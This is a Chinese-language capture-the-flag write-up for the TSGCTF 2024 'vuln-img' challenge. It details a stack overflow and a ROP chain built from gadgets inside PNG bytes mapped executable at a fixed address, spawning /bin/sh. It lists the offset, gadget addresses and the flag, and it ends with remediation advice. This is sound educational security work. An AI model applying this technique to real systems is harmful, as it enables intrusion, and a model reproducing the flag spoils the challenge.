# TSGCTF2024 vuln-img

## 题目简述

程序把 `something.png` 读入一个由自定义链接脚本放在固定地址 `0x01000000` 的 16 MiB 全局数组：

```ld
IMG_RAM (rwx) : ORIGIN = 0x01000000, LENGTH = 0x1000000

.img : {
    *(.img)
} > IMG_RAM
```

读取后程序调用：

```c
mprotect(img_data, IMG_DATA_SIZE, VALIDATE_PROT(~PROT_WRITE));
```

其中 `VALIDATE_PROT` 只保留 `PROT_READ | PROT_WRITE | PROT_EXEC` 三个位。`~PROT_WRITE` 经掩码后得到 `PROT_READ | PROT_EXEC`，所以 PNG 字节被映射成固定地址的可执行数据。命令循环又使用无长度限制的 `scanf("%s", buf)` 写入 0x100 字节栈缓冲区，形成栈溢出。

## 解题过程

图像的画面内容与利用无关，真正有用的是 PNG 文件的原始字节。由于二进制关闭 PIE，`.img` 地址固定；相同 PNG 每次都落在 `0x01000000`，可直接在这段字节流中搜索以 `ret` 结尾的指令片段，把图片本身当作 ROP gadget 库。

从 `buf` 开始覆盖到保存返回地址的偏移为 `0x118`：

```python
payload = b"A" * 0x118
```

官方 solver 选出的 gadget 全部位于 PNG 映射，例如：

```text
0x01004952  pop rdi; ...; ret
0x010058ba  pop rdx; ...; ret
0x0100771e  pop rcx; ret
0x0100c30e  pop rax; ret
0x0100ccb7  syscall
0x0100d883  pop rsp; call rcx
```

ROP 链完成以下寄存器设置：

```text
rax = 59              # execve
rdi = 0x00fffff0      # 稍后写入 "/bin/sh\0"
rsi = 0x00fff300      # 零值区域
rdx = 0x00fff300      # 零值区域
```

链中先把字节串 `/bin/sh\0` 放入 `rbx`，再用 `pop rsp; call rcx` 把栈迁到 PNG 段起始地址附近。随后执行 `push rbx; call rbp`：前一次 `call` 与 `push` 会在 `0x01000000` 下方的可写映射中布置返回地址和 `/bin/sh`，而 `rbp` 指向 `syscall` gadget。最终执行：

```c
execve("/bin/sh", NULL, NULL);
```

取得 shell 后读取随机后缀的 flag 文件：

```sh
cat flag*
```

得到：

```text
TSGCTF{jmpng_1nt0_the_png_1mage}
```

## 方法总结

本题的利用链是“栈溢出 + 可执行图像数据 + 固定地址 ROP”。PNG 不是隐写载体，而是被程序主动复制到 RX 内存的指令素材，因此归入 Pwn。修复应为命令输入设置长度上限，并遵守 W^X：写入图片时使用 RW，完成后只切为 R，绝不能授予执行权限；同时启用 PIE、栈保护等常规缓解措施，避免攻击者直接复用固定地址数据。
